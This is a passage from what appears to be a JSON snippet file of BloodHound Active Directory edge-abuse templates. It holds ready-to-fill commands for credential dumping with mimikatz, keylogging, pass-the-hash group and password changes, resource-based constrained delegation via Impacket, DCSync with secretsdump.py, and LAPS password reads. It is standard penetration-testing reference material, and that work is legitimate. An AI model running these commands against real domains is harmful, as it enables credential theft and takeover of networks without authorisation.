            "The user $TARGET has a session on the computer $CONTROLLED.When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process.Any user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists.Note: A session does not guarantee credential material is present, only possible.",
            "To Abuse 'HasSession' commonly: ",
            "Password Theft",
            "When a user has a session on the computer, you may be able to obtain credentials for the user via credential dumping or token impersonation. You must be able to move laterally to the computer, have administrative access on the computer, and the user must have a non-network logon session on the computer.",
            "Once you have established a Cobalt Strike Beacon, Empire agent, or other implant on the target, you can use mimikatz to dump credentials of the user that has a session on the computer. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system.",
            "You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's \"keyscan_start\" command to start keylogging a user, then \"keyscan_dump\" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard.",
            "Token Impersonation",
            "You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab.",
            "User sessions can be short lived and only represent the sessions that were present at the time of collection. A user may have ended their session by the time you move to the computer to target them. However, users tend to use the same machines, such as the workstations or servers they are assigned to use for their job duties, so it can be valuable to check multiple times if a user session has started."
        ]
    },
    "AddMember linux abuse (bloodhound)": {
        "description": "This entity has the ability to add arbitrary principals, including itself, to the group target object. Because of security group delegation, the members of a security group have the same privileges as that group.By adding itself to the group, controlled object will gain the same privileges that target object already has.",
        "prefix": "AddMember",
        "body": [
            "This entity has the ability to add arbitrary principals, including itself, to the group $TARGET. Because of security group delegation, the members of a security group have the same privileges as that group.By adding itself to the group, $CONTROLLED will gain the same privileges that $TARGET already has.",
            "To Abuse 'AddMember' on linux: ",
            "Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:",
            "```sh",
            "net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```",
            "It can also be done with pass-the-hash using [pth-toolkit's net tool](https://github.com/byt3bl33d3r/pth-toolkit). If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.",
            "```sh",
            "pth-net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"LMhash\":\"NThash\" -S \"DomainController\"",
            "```",
            "Finally, verify that the user was successfully added to the group:",
            "```sh",
            "net rpc group members \"TargetGroup\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```"
        ]
    },
    "ForceChangePassword linux abuse (bloodhound)": {
        "description": "This entity has the capability to change the  target object's password without knowing that user's current password.",
        "prefix": "ForceChangePassword",
        "body": [
            "This entity has the capability to change the  $TARGET's password without knowing that user's current password.",
            "To Abuse 'ForceChangePassword' on linux: ",
            "Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.",
            "```sh",
            "net rpc password \"TargetUser\" \"newP@ssword2022\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"",
            "```",
            "It can also be done with pass-the-hash using [pth-toolkit's net tool](https://github.com/byt3bl33d3r/pth-toolkit). If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.",
            "```sh",
            "pth-net rpc password \"TargetUser\" \"newP@ssword2022\" -U \"DOMAIN\"/\"ControlledUser\"%\"LMhash\":\"NThash\" -S \"DomainController\"",
            "```",
            "Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."
        ]
    },
    "GenericWrite linux abuse (bloodhound)": {
        "description": "This entity has generic write access to the  target object.Generic Write access grants you the ability to write to any non-protected attribute on the target object, including \"members\" for a group, and \"serviceprincipalnames\" for a user",
        "prefix": "GenericWrite",
        "body": [
            "This entity has generic write access to the  $TARGET.Generic Write access grants you the ability to write to any non-protected attribute on the target object, including \"members\" for a group, and \"serviceprincipalnames\" for a user",
            "To Abuse 'GenericWrite' on linux: ",
            "Too much abuse techniques, please refer to the original document for details"
        ]
    },
    "Owns linux abuse (bloodhound)": {
        "description": "This entity has ownership of the  target object.The owner of an object is implicitly granted the ability to modify object security descriptors, including the DACL, when the following conditions are met:\nThe OWNER RIGHTS SID (S-1-3-4) is not explicitly granted privileges on the object\n```sh\n(Get-ACL -Path (\"AD:\" + \"CN=Object,DC=example,DC=com\")).Access | Where-Object { $_.IdentityReference -eq \"OWNER RIGHTS\" }\n```\nOR\n\nImplicit owner rights are not blockedImplicit owner rights are not blocked and are therefore abusable when the following conditions are met:The domain's BlockOwnerImplicitRights setting is not in enforcement mode. This setting is defined in the 29th character in the domain's dSHeuristics attribute. When set to 0 or 2, implicit owner rights are not blocked.\n```sh\n$searcher = [adsisearcher]\"\"\n$searcher.SearchRoot = \"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=EXAMPLE,DC=LOCAL\"\n$searcher.SearchScope = [System.DirectoryServices.SearchScope]::Base\n$searcher.Filter = \"(objectClass=*)\"\n$searcher.PropertiesToLoad.Add(\"DSHeuristics\") | Out-Null\n$result = $searcher.FindOne()\nWrite-Output \"DSHeuristics: $($result.Properties['DSHeuristics'])\"\n```\nAND EITHER:\n\nThe object is not a computer or derivative of a computer object (e.g., MSA, GMSA)\nOR\n\nThe object is a computer or derivative of a computer object and the owner is a member of the Domain Admins or Enterprise Admins group (or is the SID of either group)",
        "prefix": "Owns",
        "body": [
            "This entity has ownership of the  $TARGET.The owner of an object is implicitly granted the ability to modify object security descriptors, including the DACL, when the following conditions are met:\nThe OWNER RIGHTS SID (S-1-3-4) is not explicitly granted privileges on the object\n```sh\n(Get-ACL -Path (\"AD:\" + \"CN=Object,DC=example,DC=com\")).Access | Where-Object { $_.IdentityReference -eq \"OWNER RIGHTS\" }\n```\nOR\n\nImplicit owner rights are not blockedImplicit owner rights are not blocked and are therefore abusable when the following conditions are met:The domain's BlockOwnerImplicitRights setting is not in enforcement mode. This setting is defined in the 29th character in the domain's dSHeuristics attribute. When set to 0 or 2, implicit owner rights are not blocked.\n```sh\n$searcher = [adsisearcher]\"\"\n$searcher.SearchRoot = \"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=EXAMPLE,DC=LOCAL\"\n$searcher.SearchScope = [System.DirectoryServices.SearchScope]::Base\n$searcher.Filter = \"(objectClass=*)\"\n$searcher.PropertiesToLoad.Add(\"DSHeuristics\") | Out-Null\n$result = $searcher.FindOne()\nWrite-Output \"DSHeuristics: $($result.Properties['DSHeuristics'])\"\n```\nAND EITHER:\n\nThe object is not a computer or derivative of a computer object (e.g., MSA, GMSA)\nOR\n\nThe object is a computer or derivative of a computer object and the owner is a member of the Domain Admins or Enterprise Admins group (or is the SID of either group)",
            "To Abuse 'Owns' on linux: ",
            "Too much abuse techniques, please refer to the original document for details"
        ]
    },
    "OwnsLimitedRights linux abuse (bloodhound)": {
        "description": "When specific privileges on an object's DACL are explicitly granted to the \"OWNER RIGHTS\" SID (S-1-3-4), implicit owner rights (e.g., WriteDacl) are blocked, and the owner is granted only the specific privileges granted to OWNER RIGHTS. This can be used to limit the rights of the owner of an object.",
        "prefix": "OwnsLimitedRights",
        "body": [
            "When specific privileges on an object's DACL are explicitly granted to the \"OWNER RIGHTS\" SID (S-1-3-4), implicit owner rights (e.g., WriteDacl) are blocked, and the owner is granted only the specific privileges granted to OWNER RIGHTS. This can be used to limit the rights of the owner of an object.",
            "To Abuse 'OwnsLimitedRights' on linux: ",
            "To abuse ownership of an object where the OWNER RIGHTS SID is explicitly granted permissions, you can abuse the specific permissions granted to the OWNER RIGHTS SID.",
            "Please refer to the abuse info for the specific granted permissions at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"
        ]
    },
    "WriteDacl linux abuse (bloodhound)": {
        "description": "This entity has permissions to modify the DACL (Discretionary Access Control List) on the  target objectWith write access to the target object's DACL, you can grant yourself any permission you want on the object.",
        "prefix": "WriteDacl",
        "body": [
            "This entity has permissions to modify the DACL (Discretionary Access Control List) on the  $TARGETWith write access to the target object's DACL, you can grant yourself any permission you want on the object.",
            "To Abuse 'WriteDacl' on linux: ",
            "Too much abuse techniques, please refer to the original document for details"
        ]
    },
    "WriteOwner linux abuse (bloodhound)": {
        "description": "This entity has the ability to modify the owner of the  target object.Implicit owner rights are not blocked and are therefore abusable via change in ownership when the following conditions are met:Inheritance is not configured for any privileges explicitly granted to the OWNER RIGHTS SID (S-1-3-4). Non-inherited privileges granted to OWNER RIGHTS are removed when the owner is changed, allowing the new owner to have the full set of implicit owner rights.The domain's BlockOwnerImplicitRights setting is not in enforcement mode. This setting is defined in the 29th character in the domain's dSHeuristics attribute. When set to 0 or 2, implicit owner rights are not blocked.\n```sh\n$searcher = [adsisearcher]\"\"\n$searcher.SearchRoot = \"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=EXAMPLE,DC=LOCAL\"\n$searcher.SearchScope = [System.DirectoryServices.SearchScope]::Base\n$searcher.Filter = \"(objectClass=*)\"\n$searcher.PropertiesToLoad.Add(\"DSHeuristics\") | Out-Null\n$result = $searcher.FindOne()\nWrite-Output \"DSHeuristics: $($result.Properties['DSHeuristics'])\"\n```The object is not a computer or a derivative of a computer object (e.g., MSA, GMSA).",
        "prefix": "WriteOwner",
        "body": [
            "This entity has the ability to modify the owner of the  $TARGET.Implicit owner rights are not blocked and are therefore abusable via change in ownership when the following conditions are met:Inheritance is not configured for any privileges explicitly granted to the OWNER RIGHTS SID (S-1-3-4). Non-inherited privileges granted to OWNER RIGHTS are removed when the owner is changed, allowing the new owner to have the full set of implicit owner rights.The domain's BlockOwnerImplicitRights setting is not in enforcement mode. This setting is defined in the 29th character in the domain's dSHeuristics attribute. When set to 0 or 2, implicit owner rights are not blocked.\n```sh\n$searcher = [adsisearcher]\"\"\n$searcher.SearchRoot = \"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=EXAMPLE,DC=LOCAL\"\n$searcher.SearchScope = [System.DirectoryServices.SearchScope]::Base\n$searcher.Filter = \"(objectClass=*)\"\n$searcher.PropertiesToLoad.Add(\"DSHeuristics\") | Out-Null\n$result = $searcher.FindOne()\nWrite-Output \"DSHeuristics: $($result.Properties['DSHeuristics'])\"\n```The object is not a computer or a derivative of a computer object (e.g., MSA, GMSA).",
            "To Abuse 'WriteOwner' on linux: ",
            "Too much abuse techniques, please refer to the original document for details"
        ]
    },
    "WriteOwnerLimitedRights linux abuse (bloodhound)": {
        "description": "When specific privileges on an object's DACL are explicitly granted to the \"OWNER RIGHTS\" SID (S-1-3-4), and inheritance is configured for those permissions, they are inherited by the new object owner after a change in ownership. In this case, implicit owner rights are blocked, and the new owner is granted only the specific inherited privileges granted to OWNER RIGHTS.",
        "prefix": "WriteOwnerLimitedRights",
        "body": [
            "When specific privileges on an object's DACL are explicitly granted to the \"OWNER RIGHTS\" SID (S-1-3-4), and inheritance is configured for those permissions, they are inherited by the new object owner after a change in ownership. In this case, implicit owner rights are blocked, and the new owner is granted only the specific inherited privileges granted to OWNER RIGHTS.",
            "To Abuse 'WriteOwnerLimitedRights' on linux: ",
            "To abuse change in ownership of an object where the OWNER RIGHTS SID is explicitly granted inherited privileges, you can modify the owner, then abuse the specific privileges granted to the OWNER RIGHTS SID in the context of the new owner.",
            "Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"
        ]
    },
    "CanRDP common abuse (bloodhound)": {
        "description": "This entity has the capability to create a Remote Desktop Connection with the computer target object.Remote Desktop access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.Note: This edge does not guarantee privileged execution.",
        "prefix": "CanRDP",
        "body": [
            "This entity has the capability to create a Remote Desktop Connection with the computer $TARGET.Remote Desktop access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.Note: This edge does not guarantee privileged execution.",
            "To Abuse 'CanRDP' commonly: ",
            "Abuse of this privilege will depend heavily on the type of access you have.",
            "PlainText Credentials with Interactive Access",
            "With plaintext credentials, the easiest way to exploit this privilege is using the built in Windows Remote Desktop Client (mstsc.exe). Open mstsc.exe and input the computer $$TARGET. When prompted for credentials, input the credentials for $$CONTROLLED to initiate the remote desktop connection.",
            "Password Hash with Interactive Access",
            "With a password hash, exploitation of this privilege will require local administrator privileges on a system, and the remote server must allow Restricted Admin Mode.",
            "First, inject the NTLM credential for the user you're abusing into memory using mimikatz:",
            "```sh",
            "lsadump::pth /user:dfm /domain:testlab.local /ntlm:&lt;ntlm hash&gt; /run:\"mstsc.exe /restrictedadmin\"",
            "```",
            "This will open a new RDP window. Input the computer $$TARGET to initiate the remote desktop connection. If the target server does not support Restricted Admin Mode, the session will fail.",
            "Plaintext Credentials without Interactive Access",
            "This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:",
            "```sh",
            "(proxychains) xfreerdp /u:dfm /d:testlab.local /v:<computer ip>",
            "```",
            "xfreerdp will prompt you for a password, and then initiate the remote desktop connection.",
            "Password Hash without Interactive Access",
            "This method will require some method of proxying traffic into the network, such as the socks command in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp (suggested because of support of Network Level Authentication (NLA)) tool, which can be installed from the freerdp-x11 package. Additionally, the target computer must allow Restricted Admin Mode. If using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection with the following command:",
            "```sh",
            "(proxychains) xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>",
            "```",
            "This will initiate the remote desktop connection, and will fail if Restricted Admin Mode is not enabled."
        ]
    },
    "ExecuteDCOM common abuse (bloodhound)": {
        "description": "This entity has membership in the Distributed COM Users local group on the computer target object.This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.",
        "prefix": "ExecuteDCOM",
        "body": [
            "This entity has membership in the Distributed COM Users local group on the computer $TARGET.This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.",
            "To Abuse 'ExecuteDCOM' commonly: ",
            "The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and ExcelDDE). LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile).",
            "One can manually instantiate and manipulate COM objects on a remote machine using the following PowerShell code. If specifying a COM object by its CLSID:",
            "```sh",
            "$$ComputerName = $$TARGET  # Remote computer",
            "$$clsid = \"{fbae34e8-bf95-4da8-bf98-6c6e580aa348}\"      # GUID of the COM object",
            "$$Type = [Type]::GetTypeFromCLSID($$clsid, $$ComputerName)",
            "$$ComObject = [Activator]::CreateInstance($$Type)",
            "```",
            "If specifying a COM object by its ProgID:",
            "```sh",
            "$$ComputerName = $$TARGET  # Remote computer",
            "$$ProgId = \"<NAME>\"      # GUID of the COM object",
            "$$Type = [Type]::GetTypeFromProgID($$ProgId, $$ComputerName)",
            "$$ComObject = [Activator]::CreateInstance($$Type)",
            "```"
        ]
    },
    "AllowedToDelegate linux abuse (bloodhound)": {
        "description": "The  controlled object has the constrained delegation permission to the computer target object.The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this permission can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the \"Protected Users\" security group or otherwise have delegation privileges revoked.An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is \"HTTP/host.domain.com\", tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.",
        "prefix": "AllowedToDelegate",
        "body": [
            "The  $CONTROLLED has the constrained delegation permission to the computer $TARGET.The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this permission can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the \"Protected Users\" security group or otherwise have delegation privileges revoked.An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is \"HTTP/host.domain.com\", tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.",
            "To Abuse 'AllowedToDelegate' on linux: ",
            "In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the \"HTTP/PRIMARY.testlab.local\" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the \"admin\" user to the \"HTTP/PRIMARY.testlab.local\" SPN. The alternative sname \"cifs\" is substituted in to the final service ticket. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the \"admin\" user.",
            "```sh",
            "getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'",
            "```"
        ]
    },
    "CoerceToTGT linux abuse (bloodhound)": {
        "description": "The  controlled object is configured with Kerberos unconstrained delegation.Users and computers authenticating against controlled object will have their Kerberos TGT sent to controlled object, unless they are marked as sensitive or members of Protected Users.An attacker with control over controlled object can coerce a Tier Zero computer (e.g. DC) to authenticate against controlled object and obtain the target's TGT. With the TGT of a DC, the attacker can perform DCSync to compromise the domain. Alternatively, the TGT can be used to obtain admin access to the target host with a shadow credentials + silver ticket attack or a resource-based constrained delegation attack.",
        "prefix": "CoerceToTGT",
        "body": [
            "The  $CONTROLLED is configured with Kerberos unconstrained delegation.Users and computers authenticating against $CONTROLLED will have their Kerberos TGT sent to $CONTROLLED, unless they are marked as sensitive or members of Protected Users.An attacker with control over $CONTROLLED can coerce a Tier Zero computer (e.g. DC) to authenticate against $CONTROLLED and obtain the target's TGT. With the TGT of a DC, the attacker can perform DCSync to compromise the domain. Alternatively, the TGT can be used to obtain admin access to the target host with a shadow credentials + silver ticket attack or a resource-based constrained delegation attack.",
            "To Abuse 'CoerceToTGT' on linux: ",
            "A common way for attackers to abuse unconstrained delegation is for the attacker to coerce a DC using the printspooler.The attack will fail if the target is a member of Protected Users or marked as sensitive, as the TGT of those principals will not be sent to the principal with unconstrained delegation. You can find all the protected principals with this Cypher query:MATCH (g:Group)",
            "WHERE g.objectid ENDS WITH \"-525\"",
            "MATCH (n:Base)",
            "WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)",
            "RETURN n",
            "LIMIT 1000There are many other coercion techniques than printspooler that can be used (see References).",
            "See 'Abusing Users Configured with Unconstrained Delegation' under References for details on the execution."
        ]
    },
    "GetChanges linux abuse (bloodhound)": {
        "description": "This entity has the DS-Replication-Get-Changes permission on the domain target object.Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack.",
        "prefix": "GetChanges",
        "body": [
            "This entity has the DS-Replication-Get-Changes permission on the domain $TARGET.Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack.",
            "To Abuse 'GetChanges' on linux: ",
            "You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:",
            "```sh",
            "secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'",
            "```",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "GetChangesAll linux abuse (bloodhound)": {
        "description": "This entity has the DS-Replication-Get-Changes-All permission on the domain target object.Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a DCSync attack.",
        "prefix": "GetChangesAll",
        "body": [
            "This entity has the DS-Replication-Get-Changes-All permission on the domain $TARGET.Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a DCSync attack.",
            "To Abuse 'GetChangesAll' on linux: ",
            "You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:",
            "```sh",
            "secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'",
            "```",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "ReadLAPSPassword linux abuse (bloodhound)": {
        "description": "This entity has the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer target object.For systems using legacy LAPS, the following AD computer object properties are relevant:\n- - ms-Mcs-AdmPwd: The plaintext LAPS password\n- - ms-Mcs-AdmPwdExpirationTime: The LAPS password expiration time\nFor systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:\n- - msLAPS-Password: The plaintext LAPS password\n- - msLAPS-PasswordExpirationTime: The LAPS password expiration time\n- - msLAPS-EncryptedPassword: The encrypted LAPS password\n- - msLAPS-EncryptedPasswordHistory: The encrypted LAPS password history\n- - msLAPS-EncryptedDSRMPassword: The encrypted Directory Services Restore Mode (DSRM) password\n- - msLAPS-EncryptedDSRMPasswordHistory: The encrypted DSRM password history\n",
        "prefix": "ReadLAPSPassword",
        "body": [
            "This entity has the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer $TARGET.For systems using legacy LAPS, the following AD computer object properties are relevant:\n- - ms-Mcs-AdmPwd: The plaintext LAPS password\n- - ms-Mcs-AdmPwdExpirationTime: The LAPS password expiration time\nFor systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:\n- - msLAPS-Password: The plaintext LAPS password\n- - msLAPS-PasswordExpirationTime: The LAPS password expiration time\n- - msLAPS-EncryptedPassword: The encrypted LAPS password\n- - msLAPS-EncryptedPasswordHistory: The encrypted LAPS password history\n- - msLAPS-EncryptedDSRMPassword: The encrypted Directory Services Restore Mode (DSRM) password\n- - msLAPS-EncryptedDSRMPasswordHistory: The encrypted DSRM password history\n",
            "To Abuse 'ReadLAPSPassword' on linux: ",
            "Read the LAPS password attributes listed in the General section.",
            "Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:",
            "```sh",
            "bloodyAD --host $$DC_IP -d $$DOMAIN -u $$USER -p $$PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime",
            "```",
            "See Windows abuse for retrieving and decrypting the encrypted attributes."
        ]
    },
    "Contains common abuse (bloodhound)": {
        "description": " controlled object contains the  target object.",
        "prefix": "Contains",
        "body": [
            " $CONTROLLED contains the  $TARGET.",
            "To Abuse 'Contains' commonly: ",
            "Permissions on the parent of a child object may enable compromise of the child object through inherited ACEs or linked GPOs.",
            "See the inbound edges on the parent object for details."
        ]
    },
    "GPLink linux abuse (bloodhound)": {
        "description": "The GPO controlled object is linked to the  target object.A linked GPO applies its settings to objects in the linked container.",
        "prefix": "GPLink",
        "body": [
            "The GPO $CONTROLLED is linked to the  $TARGET.A linked GPO applies its settings to objects in the linked container.",
            "To Abuse 'GPLink' on linux: ",
            "With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse.",
            "[pyGPOAbuse.py](https://github.com/Hackndo/pyGPOAbuse) can be used for that purpose."
        ]
    },
    "AddAllowedToAct linux abuse (bloodhound)": {
        "description": "This entity has can modify the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer target object.The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket \"as\" this user.One caveat is that impersonated users can not be in the \"Protected Users\" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.",
        "prefix": "AddAllowedToAct",
        "body": [
            "This entity has can modify the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer $TARGET.The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket \"as\" this user.One caveat is that impersonated users can not be in the \"Protected Users\" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.",
            "To Abuse 'AddAllowedToAct' on linux: ",
            "First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:",
            "```sh",
            "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$$' -computer-pass 'Summer2018!' -dc-host $$DomainController -domain-netbios $$DOMAIN 'domain/user:password'",
            "```",
            "We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:",
            "```sh",
            "rbcd.py -delegate-from 'ATTACKERSYSTEM$$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'",
            "```",
            "And finally we can get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. Impacket's getST.py example script can be used for that purpose.",
            "```sh",
            "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$$:Summer2018!'",
            "```",
            "This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."
        ]
    },
    "AllowedToAct linux abuse (bloodhound)": {
        "description": "This entity has is added to the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer target object.An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket \"as\" this user.One caveat is that impersonated users can not be in the \"Protected Users\" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.",
        "prefix": "AllowedToAct",
        "body": [
            "This entity has is added to the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer $TARGET.An attacker can use this account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket \"as\" this user.One caveat is that impersonated users can not be in the \"Protected Users\" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.",
            "To Abuse 'AllowedToAct' on linux: ",
            "We can then get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. Impacket's getST.py example script can be used for that purpose.",
            "```sh",
            "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$$:Summer2018!'",
            "```",
            "This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."
        ]
    },
    "SQLAdmin common abuse (bloodhound)": {
        "description": "The user controlled object is a SQL admin on the computer target object.There is at least one MSSQL instance running on target object where the user controlled object is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of \"MSSQLSvc\" Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.Author: Scott Sutherland",
        "prefix": "SQLAdmin",
        "body": [
